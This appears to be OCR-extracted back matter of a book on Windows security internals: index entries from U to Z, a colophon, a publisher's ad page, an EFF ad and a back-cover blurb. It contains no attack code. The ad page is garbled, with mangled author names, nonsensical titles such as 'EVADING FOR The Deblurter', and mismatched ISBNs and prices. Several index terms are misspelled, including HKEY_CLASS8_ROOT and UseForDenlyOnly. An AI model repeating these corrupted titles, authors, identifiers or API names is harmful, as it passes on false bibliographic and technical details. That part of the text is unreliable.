U2U (User-to-User) authentication, 491–493 UAC. See User Account Control UIPI (User Interface Privilege Isolation), 76, 129 UMFD (user-mode font driver) process, 92, 405 unconstrained delegation, 480–484 Unicode NTLM flag, 427 UNICODE_STRING structure, 31, 85–86 Universal group scope, 347, 354 Unprotect- commands, 441, 446, 471, 476 Unprotectedacl security information flag, 210–211 Unprotectedacl security information flag, 210 Unprotect- functions, 328–331 Update- commands, 4–5, 427–428 UPNs (user principal names), 345 UseForDenlyOnly attribute, 111–112 USER32library, 70–71 User Account Control (UAC), 93, 124–126, 409 elevation type, 126–129 execution levels, 126 filtering, 416 linked tokens, 126–129

---

querying executable manifest information, 125 UI access, 129, 138–139 virtualization, 129–130 User-Account-Restrictions property set, 374–375 User-Change-Password access right, 377–378 user delegation rights, 381 user desktop creation, 398–399 User-Force-Change-Password access right, 377–378 User Interface Privilege Isolation (UIPI), 76, 129 user-mode access checks, 225 user-mode applications, 64–96 DOS device paths, 83–87 process creation, 87–91 system processes, 91–93 Win32 APIs, 64–70, 77–80 GUI, 70–77 registry paths, 80–82 worked examples, 94–96 user-mode font driver (UMFD) process, 92, 405 user principal names (UPNs), 345 User-to-User (U2U) authentication, 491–493

## v

variables enumerating all, 7 predefined, 6-7 $VerbosePreference global variable, 454 View access right, 320 ViewAuditInformation access right, 319 ViewLocalInformation access right, 319-320 VirtualBox, 537 virtualization, 129-130, 484 VirtualizationEnabled property, 130 Visual Studio, 261, 538 VMS, 292

## W

WarningAction parameter, 276 WebClient class, 522

Where-Object command, 17–19 wide strings, 79 wildcard syntax, 10–11, 15 Win32 APIs, 64–70 loading new libraries, 65–66 searching for DLLs, 68–70 security APIs, 208–213 system calls and, 77–80 viewing imported APIs, 66–67 GUI, 70–77 console sessions, 74–77 kernel resources, 71–73 modules, 70 window messages, 73–74 registry paths, 80–82 handles, 80–81 HKEY_CLASS8_ROOT handle, 90 listing registry contents, 81–82 opening keys, 81 WIN32K driver, 70–71 Win2Path parameter, 81 WIN32Ulibrary, 70–71 window classes, 73 messages, 73–74 objects, 71–73 Windows authentication, 299–340 Active Directory, 341–396 domain authentication, 300–304 interactive authentication, 397–419 local domain configuration, 305–311 network authentication, 299, 421–455 remote LSA services, 311–324 SAM database, 324–334 SECURITY database, 334–336 worked examples, 336–339 Windows domain network, 535–545 configuration, 536 virtual machines, 538–545 Windows Hyper-V, 47, 537–538 Windows Installer service, 93 Windows kernel, 23–61

subsystems and components of, 24–56

Index 57

---

Windows kernel (continued) user-mode applications, 64–96 worked examples, 56–61 Windows operating system , xxxvii PowerShell testing environment setup, 3–21 user-mode applications, 64–96 Windows kernel, 23–56 Windows Subsystem for Linux, 64 WindowStation objects, 71–72 Windows Update service, 4, 93 Winlogon process, 75, 398–399, 408 WinRM protocol, 515 WinSock API, 47 WM_CLOSE message, 73 WM_GETTEXT message, 74 WM_TIMER message, 76 World security authority, 219 WParam parameter, 74 WriteAccount access right, 316, 318 Write- commands, 16, 49–50, 59, 291, 448, 454

WriteDac access right, 36, 205-206, 233, 235, 365

WriteGroupInformation access right, 316

WriteOtherParameters access right, 315

WriteOwner access right, 87, 117, 205, 206, 239

WritePasswordParams access right, 314

WritePreferences access right, 316

WriteProp access right, 366, 370, 372, 375, 378

write-restricted tokens, 119

write-validated access rights, 378-379

## X

X.509 certificates, 342, 505 XML, 20, 528-529

## Z

Zerologon (CVE-2020-1472) security issue, 403 Zw (Nt) prefix, 24, 29-30, 224

---

Windows Security Internals is set in New Baskerville, Futura, Dogma, and TheSamsMono Condensed.

---



---

RESOURCES

Visit https://nostarch.com/windows-security-internals for errata and more information.

More no-nonsense books from

![Figure](figures/WindowsSecurityInternals_page_605_figure_003.png)

NO STARCH PRESS

![Figure](figures/WindowsSecurityInternals_page_605_figure_005.png)

ATTACKING NETWORK PROTOCOLS

A Hacker's Guide to Capture, Analysis, and Exploitation

BY JAMES FORSHAM A Memoir of the Life of Mr James Forsham ISBN 978-1-59292-750-6

![Figure](figures/WindowsSecurityInternals_page_605_figure_009.png)

POWERSHELL FOR SYDADINS

Workflow Automation Made Easy

BY ADAM BERTAM PhD, MHA, RN, PBA, FPMRC 978-0-12-59327-918-6

![Figure](figures/WindowsSecurityInternals_page_605_figure_012.png)

EVADING FOR

The Deblurter is de-fo t o be used for the image deblurring.

B.MATT HAN Consultant, M.B. ISBN 978-1-7185-0354-2

![Figure](figures/WindowsSecurityInternals_page_605_figure_015.png)

HOW TO HACK LIKE A LEGEND

Breaking Windows

B) SPARC FLOW A) SPARC PIPE ISBN 978-1-7185-0150-6

![Figure](figures/WindowsSecurityInternals_page_605_figure_019.png)

PRACTICAL VULNERABILITY MANAGEMENT

A Strategic Approach to Managing Cyber Risk

JIN ANDREW MAGNUSSON 0278-5193/97/98 $20.00

![Figure](figures/WindowsSecurityInternals_page_605_figure_023.png)

PRACTICAL MALWARE ANALYSIS

The Hands-On Guide to Dissecting Malicious Software

BY MICHAL SIKORSKI AND ANDREW HONIG

800 pp., $59.99 ISBN 978-1-59527-290-4

PHONE: 800.420.7240 ok 415.863.9900

EMAIL: SALES@NOSTARCH.COM WEB: WWW.NOSTARCH.COM

---



---

![Figure](figures/WindowsSecurityInternals_page_607_figure_000.png)

Never before has the world relied so heavily on the Internet to stay connected and informed. That makes the Electronic Frontier Foundation's mission—to ensure that technology supports freedom, justice, and innovation for all people— more urgent than ever.

For over 30 years, EFF has fought for tech users through

activism, in the courts, and by developing software to overcome

obstacles to your privacy, security, and free expression. This

dedication empowers all of us through darkness. With your help

we can navigate toward a brighter digital future.

![Figure](figures/WindowsSecurityInternals_page_607_figure_003.png)

LEARN MORE AND JOIN EFF AT EFF.ORG/NO-STARCH-PRESS

---



---



---



---

A Hands-On Exploration of Windows Security

Windows Security Internals is a must-have for anyone needing to understand the Windows operating system's low-level implementations, whether to discover new vulnerabilities or protect against known ones. Developers, devops, and security researchers will all find unparalleled insight into the operating system's key elements and weaknesses, surpassing even Microsoft's official documentation.

Author James Forshaw teaches through meticulously crafted PowerShell examples that can be experimented with and modified, covering everything from basic resource security analysis to advanced techniques like using network authentication. The examples will help you actively test and manipulate system behaviors, learn how Windows secures files and the registry, re-create from scratch how the system grants access to a resource, learn how Windows implements authentication both locally and over a network, and much more.

You'll also explore a wide range of topics, such as:

- * Windows security architecture, including
both the kernel and user-mode applications

* The Windows Security Reference Monitor
(SRM), including access tokens, querying
and setting a resource's security descriptor,
and access checking and auditing
- * Interactive Windows authentication and
credential storage in the Security Account
Manager (SAM) and Active Directory

* Mechanisms of network authentication
protocols, including NTLM and Kerberos
In an era of sophisticated cyberattacks on Windows networks, mastering the operating system's complex security mechanisms is more crucial than ever. Whether you're defending against the latest cyber threats or delving into the intricacies of Windows security architecture, you'll find Windows Security Internals indispensable in your efforts to navigate the complexities of today's cybersecurity landscape.

About the Author

JAMES FORSHAW is a veteran computer security expert on Google's Project Zero team. In his more than 20 years of experience analyzing and exploiting security issues in Microsoft Windows and other products, he has discovered hundreds of publicly disclosed vulnerabilities. Forshaw frequently presents his research in blogs, at global conferences, and through innovative tooling, and his work is widely cited across the industry.

Covers Windows 10 and higher and Windows Server 2016 and higher

![Figure](figures/WindowsSecurityInternals_page_611_figure_010.png)

THE FINEST IN GEE ENTEINARTS™ www.nostarch.com

